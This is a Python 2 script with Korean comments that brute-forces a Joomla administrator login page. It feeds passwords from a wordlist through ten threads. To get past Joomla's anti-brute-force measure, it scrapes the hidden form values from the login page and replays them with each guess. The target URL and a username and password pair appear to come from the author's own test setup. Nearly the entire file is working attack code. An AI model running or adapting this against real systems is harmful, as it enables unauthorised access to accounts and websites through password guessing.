#!/usr/bin/python
# -*- coding: UTF-8 -*-
import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

# general settings
user_thread = 10
username = "jwmoon"
wordlist_file = "cain.txt" # password file
resume = None

# target specific settings
target_url = "http://www.jw.com/joomla/administrator/index.php"
target_post = "http://www.jw.com/joomla/administrator/index.php"
# username : jwmoon / password: 1q2w3e

username_field = "username"
password_field = "passwd"

success_check = "Control Panel"

class Bruter(object):
    def __init__(self, username, words):
        
        self.username = username
        self.password_q = words
        self.found = False
        
        print "Finished setting up for: %s" % username
        
    def run_bruteforce(self):
        
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()
            
    def web_bruter(self):
        
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            
            page = response.read()
            
            print "Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize())
            
            # joomla는 로그인 부르트-포스 공격을 막기 위해 로그인 페이지에 히든 값을 세팅해놓는다.
            # 이 히든 값을 로그인 요청시에 함께 보내지 않으면 로그인이 실패한다.
            # 이 로직을 해킹하기 위해서는 , 매번 요청을 보낸 결과 페이지를 파싱해서 히든 값들을 얻어온 후, 그 값들을 요청을 보낼 때 같이 보내면 된다.
            parser = BruteParser()
            parser.feed(page)
            
            
            post_tags = parser.tag_results # 히든 값들 얻어오기
            # print "*** tags : %s" % post_tags
            
            # id 와 무작위 비밀번호 세팅
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            
            login_data = urllib.urlencode(post_tags)
            login_response = opener.open(target_post, login_data) # 전송 및 결과 획득
            
            login_result = login_response.read()
            
            if success_check in login_result:
                self.found = True
                print "[*] Bruteforce successful."
                print "[*] Username: %s " % username
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."
                
                
                
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
        
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_Value = value
                    
            if tag_name is not None:
                self.tag_results[tag_name] = value
                
                
                
# 패스워드 사전 파일에서 데이터를 얻어와 큐에 저장하기             
def build_wordlist(wordlist_file):
    
    # word list 파일에서 데이터를 읽어온다.
    fd = open (wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()
    
    found_resume = False
    words = Queue.Queue()   # word 를 저장할 큐 준비
    
    for word in raw_words:
        word = word.rstrip()
        
        if resume is not None: # 중복여부 판별
            
            if found_resume:
                words.put(word) # 발견한 단어를 큐에 넣는다.
            else:
                if word == resume:
                    found_resume = True
                    print "Resuming wordlist from: %s" % resume
        else:
            words.put(word)
            
    return words

words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()